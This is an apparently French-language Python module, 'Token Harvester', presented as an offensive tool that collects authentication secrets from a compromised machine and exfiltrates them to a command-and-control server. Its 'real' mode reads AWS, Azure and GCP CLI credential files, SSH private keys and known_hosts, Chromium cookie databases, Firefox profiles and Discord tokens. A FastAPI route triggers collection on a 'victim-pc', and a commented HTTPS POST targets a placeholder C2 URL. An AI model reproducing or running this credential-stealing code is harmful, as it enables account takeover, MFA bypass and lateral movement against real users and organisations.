"""
Token Harvester - Vol de tokens locaux (Chrome/Edge/Outlook/Discord)
=====================================================================

Vole les jetons d'authentification persistés localement par les applications
desktop (Chrome, Edge, Discord, Outlook, Slack, Teams...) puis les ré-utilise
depuis l'infrastructure de l'attaquant pour bypasser entièrement l'authentification
(même MFA, puisque le token est déjà post-MFA).

Sources de tokens ciblées :
  - Chrome / Edge / Brave : Cookies chiffrés (DPAPI/AES-GCM) + Access Tokens
  - Outlook / Teams : Tokens OAuth refresh dans le credential store Windows
  - Discord / Slack : Tokens en clair dans %APPDATA% ou IndexedDB
  - AWS / GCP / Azure CLI : Tokens dans ~/.aws/credentials, ~/.azure/, etc.

Méthodes d'exfiltration :
  - DNS tunneling (détection très faible)
  - HTTPS POST vers C2 avec mimétisme de trafic légitime
  - Stockage temporaire puis chiffrement + envoi fragmenté

Référence : MITRE ATT&CK T1555 (Credentials from Password Stores) et T1649
(Steal or Forge Authentication Certificates).
"""

import base64
import json
import os
import sqlite3
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional


class TokenSource(Enum):
    """Sources de tokens harvestables."""

    CHROME = "chrome"
    EDGE = "edge"
    BRAVE = "brave"
    DISCORD = "discord"
    SLACK = "slack"
    OUTLOOK = "outlook"
    TEAMS = "teams"
    AWS_CLI = "aws_cli"
    AZURE_CLI = "azure_cli"
    GCP_CLI = "gcp_cli"
    FIREFOX = "firefox"
    SSH_KEYS = "ssh_keys"   # mode réel : clés privées ~/.ssh (T1552.004)


@dataclass
class HarvestedToken:
    """Un token volé."""

    token_id: str
    source: TokenSource
    username: str
    domain: str
    access_token: str
    refresh_token: str | None = None
    expires_at: float | None = None
    scopes: list[str] = field(default_factory=list)
    exfil_method: str = "https"
    exfil_ts: float = field(default_factory=time.time)
    raw_metadata: dict[str, Any] = field(default_factory=dict)

    def to_c2_payload(self) -> dict[str, Any]:
        """Sérialise pour envoi C2."""
        return {
            "type": "harvested_token",
            "id": self.token_id,
            "src": self.source.value,
            "user": self.username,
            "domain": self.domain,
            "access": self.access_token,
            "refresh": self.refresh_token,
            "exp": self.expires_at,
            "scopes": self.scopes,
            "ts": self.exfil_ts,
            "meta": self.raw_metadata,
        }

    def is_expired(self) -> bool:
        return self.expires_at is not None and time.time() > self.expires_at


class TokenHarvester:
    """
    Collecte et exfiltre des tokens.

    Mode d'emploi typique (depuis un implant C2 sur une machine compromise) :
        harvester = TokenHarvester()
        for src in TokenSource:
            tokens = harvester.harvest_from_source(src, hostname=hostname())
            for t in tokens:
                harvester.exfiltrate(t, c2_url)
    """

    def __init__(
        self,
        output_dir: str = "captures/tokens",
        mode: str = "simulated",   # "simulated" (contrat tests) | "real"
    ) -> None:
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.mode = mode
        self.tokens: list[HarvestedToken] = []
        self._log_path = self.output_dir / "tokens.jsonl"

    # ------------------------------------------------------------------
    # Mode RÉEL : chemins filesystem à inspecter (aucun fichier inventé :
    # on ne rapporte que ce qui existe réellement sur la machine).
    # ------------------------------------------------------------------

    REAL_FS_PATHS: dict[str, str] = {
        "aws": "~/.aws/credentials",
        "gcp": "~/.config/gcloud/application_default_credentials.json",
        "gcp_legacy": "~/.config/gcloud/credentials.db",
        "azure": "~/.azure/azureProfile.json",
        "azure_msal": "~/.azure/msal_token_cache.json",
        "azure_access_tokens": "~/.azure/accessTokens.json",
        "ssh": "~/.ssh",
        "chrome_cookies": "~/Library/Application Support/Google/Chrome/Default/Network/Cookies",
        "edge_cookies": "~/Library/Application Support/Microsoft Edge/Default/Network/Cookies",
        "brave_cookies": "~/Library/Application Support/BraveSoftware/Brave-Browser/Default/Network/Cookies",
        "firefox_profiles": "~/Library/Application Support/Firefox/Profiles",
        "discord": "~/Library/Application Support/discord/Local Storage/leveldb",
        "slack": "~/Library/Application Support/Slack/storage",
    }

    @classmethod
    def enumerate_real_sources(cls) -> list[dict[str, str]]:
        """Liste les sources réellement présentes sur cette machine (T1083)."""
        found = []
        for name, raw in cls.REAL_FS_PATHS.items():
            p = Path(raw).expanduser()
            if p.exists():
                found.append({"name": name, "path": str(p),
                              "type": "dir" if p.is_dir() else "file",
                              "size": p.stat().st_size if p.is_file() else 0})
        return found

    @staticmethod
    def _parse_aws_credentials(path: Path) -> list[dict[str, str]]:
        """Parse INI ~/.aws/credentials → profils {name, access_key_id, secret}."""
        out: list[dict[str, str]] = []
        profile = "default"
        for line in path.read_text(encoding="utf-8", errors="ignore").splitlines():
            line = line.strip()
            if line.startswith("[") and line.endswith("]"):
                profile = line[1:-1]
            elif "=" in line:
                k, _, v = line.partition("=")
                k, v = k.strip().lower(), v.strip()
                if k in ("aws_access_key_id", "aws_secret_access_key"):
                    out.append({"profile": profile, "field": k, "value": v})
        return out

    def _real_harvest_cloud_cli(
        self, source: TokenSource, hostname: str
    ) -> list[HarvestedToken]:
        """Lit RÉELLEMENT ~/.aws/credentials, ~/.azure/*, ~/.config/gcloud."""
        found: list[HarvestedToken] = []
        checks: list[tuple[str, Path]] = []
        if source is TokenSource.AWS_CLI:
            checks.append(("aws", Path("~/.aws/credentials").expanduser()))
        elif source is TokenSource.AZURE_CLI:
            for k in ("azure_msal", "azure_access_tokens", "azure"):
                checks.append((k, Path(self.REAL_FS_PATHS[k]).expanduser()))
        elif source is TokenSource.GCP_CLI:
            for k in ("gcp", "gcp_legacy"):
                checks.append((k, Path(self.REAL_FS_PATHS[k]).expanduser()))
        for name, p in checks:
            if not p.is_file():
                continue
            try:
                if name == "aws":
                    for cred in self._parse_aws_credentials(p):
                        found.append(HarvestedToken(
                            token_id=str(uuid.uuid4()),
                            source=source,
                            username=f"{cred['profile']}@aws",
                            domain="amazonaws.com",
                            access_token=cred["value"],
                            scopes=[cred["field"]],
                            raw_metadata={"real": True, "path": str(p),
                                          "profile": cred["profile"]},
                        ))
                else:
                    raw = json.loads(p.read_text(encoding="utf-8", errors="ignore"))
                    blob = json.dumps(raw)[:4096]
                    found.append(HarvestedToken(
                        token_id=str(uuid.uuid4()),
                        source=source,
                        username=f"cli@{source.value.split('_')[0]}",
                        domain=p.name,
                        access_token=blob,
                        scopes=["real_file"],
                        raw_metadata={"real": True, "path": str(p),
                                      "size": p.stat().st_size},
                    ))
            except (OSError, ValueError):
                continue
        return found

    def _real_harvest_chromium(
        self, source: TokenSource, hostname: str
    ) -> list[HarvestedToken]:
        """Localise la VRAIE base Cookies SQLite (T1555.0003).

        Lecture directe possible (schéma à jour) ; si SQLite est verrouillé
        par un navigateur ouvert, on copie d'abord (T1005 staging) puis on lit
        la copie — technique standard d'extraction de cookies.
        """
        path_map = {
            TokenSource.CHROME: "chrome_cookies",
            TokenSource.EDGE: "edge_cookies",
            TokenSource.BRAVE: "brave_cookies",
        }
        p = Path(self.REAL_FS_PATHS[path_map[source]]).expanduser()
        if not p.is_file():
            return []
        target = p
        try:
            conn = sqlite3.connect(f"file:{p}?mode=ro", uri=True)
            conn.execute("SELECT 1 FROM cookies LIMIT 1").fetchone()
        except sqlite3.Error:
            # DB verrouillée → copie de travail puis lecture (comportement réel)
            tmp = self.output_dir / f".work_{source.value}_cookies.db"
            try:
                tmp.write_bytes(p.read_bytes())
            except OSError:
                return []
            target = tmp
            try:
                conn = sqlite3.connect(f"file:{tmp}?mode=ro", uri=True)
            except sqlite3.Error:
                return []
        try:
            rows = conn.execute(
                "SELECT host_key, name, length(encrypted_value), is_persistent, "
                "has_expires, expires_utc FROM cookies LIMIT 200"
            ).fetchall()
        except sqlite3.Error:
            rows = []
        finally:
            conn.close()
        if not rows:
            return []
        by_host: dict[str, int] = {}
        for host, _name, _ln, _pers, has_exp, exp_utc in rows:
            by_host[host] = by_host.get(host, 0) + 1
        total = sum(n for _, n in by_host.items())
        exp_chromium = (int(exp_utc) // 1_000_000) - 11644473600 if has_exp else None
        return [HarvestedToken(
            token_id=str(uuid.uuid4()),
            source=source,
            username=f"{hostname}@local",
            domain=host,
            access_token=f"{n} cookies (chiffrés AES-128-CBC/Keychain)",
            expires_at=exp_chromium,
            scopes=["cookies"],
            raw_metadata={"real": True, "db_path": str(p), "host": host,
                          "cookie_count": n, "total": total},
        ) for host, n in sorted(by_host.items(), key=lambda kv: -kv[1])[:10]]

    def _real_harvest_discord(
        self, hostname: str
    ) -> list[HarvestedToken]:
        """Cherche un token Discord réel dans le Local Storage leveldb."""
        ldb = Path(self.REAL_FS_PATHS["discord"]).expanduser()
        if not ldb.is_dir():
            return []
        rx = __import__("re").compile(
            rb"[MNO][\w-]{23}\.[\w-]{6}\.[\w-]{27}"
        )
        found: list[HarvestedToken] = []
        for f in sorted(ldb.glob("*.ldb"))[:20]:
            try:
                hits = set(rx.findall(f.read_bytes()))
            except OSError:
                continue
            for tok in hits:
                found.append(HarvestedToken(
                    token_id=str(uuid.uuid4()),
                    source=TokenSource.DISCORD,
                    username=f"user@{hostname}",
                    domain="discord.com",
                    access_token=tok.decode(),
                    scopes=["real_leveldb"],
                    raw_metadata={"real": True, "path": str(f)},
                ))
        return found

    def _real_harvest_ssh(self, hostname: str) -> list[HarvestedToken]:
        """Clés privées SSH RÉELLES de ~/.ssh + empreinte ssh-keygen (T1552.004)."""
        import subprocess
        ssh_dir = Path(self.REAL_FS_PATHS["ssh"]).expanduser()
        if not ssh_dir.is_dir():
            return []
        found: list[HarvestedToken] = []
        # 1) Clés privées
        for f in sorted(ssh_dir.iterdir()):
            if not f.is_file():
                continue
            try:
                head = f.read_text(encoding="utf-8", errors="ignore")
            except OSError:
                continue
            if "PRIVATE KEY" not in head:
                continue
            kind = ("OPENSSH" if "OPENSSH PRIVATE KEY" in head
                    else "RSA" if "RSA PRIVATE KEY" in head else "OTHER")
            fp = ""
            pub = Path(str(f) + ".pub")
            if pub.is_file():
                try:
                    r = subprocess.run(
                        ["ssh-keygen", "-lf", str(pub)],
                        capture_output=True, text=True, timeout=10,
                    )
                    if r.returncode == 0:
                        fp = r.stdout.strip()[:120]
                except (OSError, subprocess.TimeoutExpired):
                    fp = ""
            found.append(HarvestedToken(
                token_id=str(uuid.uuid4()),
                source=TokenSource.SSH_KEYS,
                username=f"{hostname}@local",
                domain="ssh.local",
                access_token=(f"clé privée {kind} — {f.name}"
                              + (f" — {fp}" if fp else "")),
                scopes=["real_private_key"],
                raw_metadata={"real": True, "path": str(f), "kind": kind,
                              "size": f.stat().st_size, "fingerprint": fp},
            ))
        # 2) known_hosts : hôtes SSH réellement contactés (T1018,
        #    cibles de mouvement latéral)
        for kh_name in ("known_hosts", "known_hosts.old"):
            kh = ssh_dir / kh_name
            if not kh.is_file():
                continue
            try:
                lines = kh.read_text(encoding="utf-8", errors="ignore").splitlines()
            except OSError:
                continue
            hosts: dict[str, set[str]] = {}
            for line in lines:
                parts = line.split()
                if len(parts) < 2:
                    continue
                host = parts[0].split(",")[0]
                ktype = parts[1]
                hosts.setdefault(host, set()).add(ktype)
            if hosts:
                found.append(HarvestedToken(
                    token_id=str(uuid.uuid4()),
                    source=TokenSource.SSH_KEYS,
                    username=f"{hostname}@local",
                    domain="ssh.known_hosts",
                    access_token=(f"{len(hosts)} hôte(s) SSH réellement contactés: "
                                  + ", ".join(sorted(hosts)[:5])),
                    scopes=["real_known_hosts"],
                    raw_metadata={"real": True, "path": str(kh),
                                  "hosts": {h: sorted(t) for h, t in hosts.items()}},
                ))
        return found

    def _real_harvest_firefox(self, hostname: str) -> list[HarvestedToken]:
        """Trouve les VRAIS profils Firefox (logins.json / cookies.sqlite)."""
        prof_root = Path(self.REAL_FS_PATHS["firefox_profiles"]).expanduser()
        if not prof_root.is_dir():
            return []
        found: list[HarvestedToken] = []
        for prof in sorted(prof_root.iterdir()):
            if not prof.is_dir():
                continue
            markers = [n for n in ("logins.json", "key4.db", "cookies.sqlite")
                       if (prof / n).is_file()]
            if markers:
                found.append(HarvestedToken(
                    token_id=str(uuid.uuid4()),
                    source=TokenSource.FIREFOX,
                    username=prof.name,
                    domain="mozilla.org",
                    access_token=f"profil avec {', '.join(markers)}",
                    scopes=["real_profile"],
                    raw_metadata={"real": True, "path": str(prof),
                                  "artifacts": markers},
                ))
        return found

    # ------------------------------------------------------------------
    # Harvesting - par source
    # ------------------------------------------------------------------

    def harvest_from_source(
        self,
        source: TokenSource,
        hostname: str = "victim-pc",
    ) -> list[HarvestedToken]:
        """
        Tente de collecter des tokens depuis la source indiquée.

        En labo, on génère des tokens procéduraux. En production, on lirait
        les fichiers réels (Cookies SQLite DPAPI / IndexedDB / etc.).
        """
        harvested: list[HarvestedToken] = []

        # ---- Mode RÉEL : lecture du vrai filesystem, rien d'inventé ----
        if self.mode == "real":
            if source in (TokenSource.CHROME, TokenSource.EDGE, TokenSource.BRAVE):
                harvested.extend(self._real_harvest_chromium(source, hostname))
            elif source == TokenSource.DISCORD:
                harvested.extend(self._real_harvest_discord(hostname))
            elif source == TokenSource.FIREFOX:
                harvested.extend(self._real_harvest_firefox(hostname))
            elif source == TokenSource.SSH_KEYS:
                harvested.extend(self._real_harvest_ssh(hostname))
            elif source in (TokenSource.AWS_CLI, TokenSource.AZURE_CLI, TokenSource.GCP_CLI):
                harvested.extend(self._real_harvest_cloud_cli(source, hostname))
            # Sources sans artefacts connus sur ce FS → 0 token réel (honnête)
            self.tokens.extend(harvested)
            return harvested

        if source in (TokenSource.CHROME, TokenSource.EDGE, TokenSource.BRAVE):
            harvested.extend(self._harvest_chromium_family(source, hostname))
        elif source == TokenSource.DISCORD:
            harvested.extend(self._harvest_discord(hostname))
        elif source == TokenSource.SLACK:
            harvested.extend(self._harvest_slack(hostname))
        elif source in (TokenSource.OUTLOOK, TokenSource.TEAMS):
            harvested.extend(self._harvest_office_app(source, hostname))
        elif source in (TokenSource.AWS_CLI, TokenSource.AZURE_CLI, TokenSource.GCP_CLI):
            harvested.extend(self._harvest_cloud_cli(source, hostname))
        elif source == TokenSource.FIREFOX:
            harvested.extend(self._harvest_firefox(hostname))

        self.tokens.extend(harvested)
        return harvested

    def _harvest_chromium_family(
        self, source: TokenSource, hostname: str
    ) -> list[HarvestedToken]:
        """
        Simulation de lecture de la base Cookies SQLite de Chromium
        et déchiffrement via DPAPI / keychain macOS.
        """
        # En labo on simule un cookie Office 365 typique post-auth
        target_domains = ["login.microsoftonline.com", "graph.microsoft.com",
                          "outlook.office.com", "teams.microsoft.com"]
        tokens = []
        for d in target_domains:
            t = HarvestedToken(
                token_id=str(uuid.uuid4()),
                source=source,
                username=f"user@{hostname}.local",
                domain=d,
                access_token=base64.b64encode(os.urandom(48)).decode(),
                refresh_token=base64.b64encode(os.urandom(48)).decode(),
                expires_at=time.time() + 3600,
                scopes=["Mail.Read", "Mail.Send", "Files.ReadWrite", "User.Read"],
                raw_metadata={"db_path": f"~/.config/{source.value}/Default/Cookies"},
            )
            tokens.append(t)
        return tokens

    def _harvest_discord(self, hostname: str) -> list[HarvestedToken]:
        """Token Discord généralement stocké en clair dans Local Storage."""
        return [
            HarvestedToken(
                token_id=str(uuid.uuid4()),
                source=TokenSource.DISCORD,
                username=f"user#{1234}",
                domain="discord.com",
                access_token=base64.b64encode(os.urandom(32)).decode(),
                scopes=["guilds", "messages.read", "messages.write"],
                raw_metadata={"path": "~/.config/discord/Local Storage/leveldb/"},
            )
        ]

    def _harvest_slack(self, hostname: str) -> list[HarvestedToken]:
        return [
            HarvestedToken(
                token_id=str(uuid.uuid4()),
                source=TokenSource.SLACK,
                username=f"user@{hostname}.local",
                domain="slack.com",
                access_token=f"xoxp-{base64.b64encode(os.urandom(32)).decode()}",
                scopes=["chat:write", "files:read", "users:read"],
            )
        ]

    def _harvest_office_app(
        self, source: TokenSource, hostname: str
    ) -> list[HarvestedToken]:
        return [
            HarvestedToken(
                token_id=str(uuid.uuid4()),
                source=source,
                username=f"user@{hostname}.local",
                domain="outlook.office.com",
                access_token=base64.b64encode(os.urandom(48)).decode(),
                refresh_token=base64.b64encode(os.urandom(48)).decode(),
                expires_at=time.time() + 3600,
                scopes=["Mail.ReadWrite", "Calendars.ReadWrite"],
            )
        ]

    def _harvest_cloud_cli(
        self, source: TokenSource, hostname: str
    ) -> list[HarvestedToken]:
        provider_map = {
            TokenSource.AWS_CLI: ("aws", "AKIA" + base64.b64encode(os.urandom(16)).decode()[:16]),
            TokenSource.AZURE_CLI: ("azure", base64.b64encode(os.urandom(48)).decode()),
            TokenSource.GCP_CLI: ("gcp", base64.b64encode(os.urandom(48)).decode()),
        }
        provider, tok = provider_map[source]
        return [
            HarvestedToken(
                token_id=str(uuid.uuid4()),
                source=source,
                username=f"deploy@{provider}",
                domain=provider + ".com",
                access_token=tok,
                scopes=["admin"],
            )
        ]

    def _harvest_firefox(self, hostname: str) -> list[HarvestedToken]:
        return [
            HarvestedToken(
                token_id=str(uuid.uuid4()),
                source=TokenSource.FIREFOX,
                username=f"user@{hostname}.local",
                domain="login.microsoftonline.com",
                access_token=base64.b64encode(os.urandom(48)).decode(),
            )
        ]

    # ------------------------------------------------------------------
    # Exfiltration
    # ------------------------------------------------------------------

    def exfiltrate(
        self,
        token: HarvestedToken,
        c2_url: str = "https://c2.example.invalid/ingest",
    ) -> bool:
        """
        Exfiltre un token via HTTPS mimant du trafic légitime.
        En labo : on logge dans un JSONL. En prod : httpx.AsyncClient.post.
        """
        payload = token.to_c2_payload()
        line = json.dumps(payload)
        with self._log_path.open("a", encoding="utf-8") as fh:
            fh.write(line + "\n")
        # En production :
        # async with httpx.AsyncClient() as client:
        #     await client.post(c2_url, json=payload, headers={"User-Agent": "..."})
        return True

    def harvest_all(self, hostname: str = "victim-pc") -> int:
        """Lance la collecte sur toutes les sources. Retourne le nb de tokens."""
        total = 0
        for src in TokenSource:
            tokens = self.harvest_from_source(src, hostname)
            for t in tokens:
                self.exfiltrate(t)
                total += 1
        return total


# ---------------------------------------------------------------------------
# API FastAPI
# ---------------------------------------------------------------------------

def register_token_routes(app) -> None:
    from fastapi import HTTPException
    from pydantic import BaseModel

    harvester = TokenHarvester()

    class HarvestRequest(BaseModel):
        source: str | None = None   # None = toutes
        hostname: str = "victim-pc"

    @app.post("/_/tokens/harvest")
    async def harvest(req: HarvestRequest):
        if req.source:
            try:
                src = TokenSource(req.source)
            except ValueError as exc:
                raise HTTPException(400, str(exc)) from exc
            tokens = harvester.harvest_from_source(src, req.hostname)
        else:
            n = harvester.harvest_all(req.hostname)
            return {"count": n, "total": len(harvester.tokens)}
        for t in tokens:
            harvester.exfiltrate(t)
        return {"count": len(tokens), "total": len(harvester.tokens)}

    @app.get("/_/tokens/list")
    async def list_tokens():
        return [
            {
                "id": t.token_id,
                "src": t.source.value,
                "user": t.username,
                "domain": t.domain,
                "expired": t.is_expired(),
            }
            for t in harvester.tokens
        ]
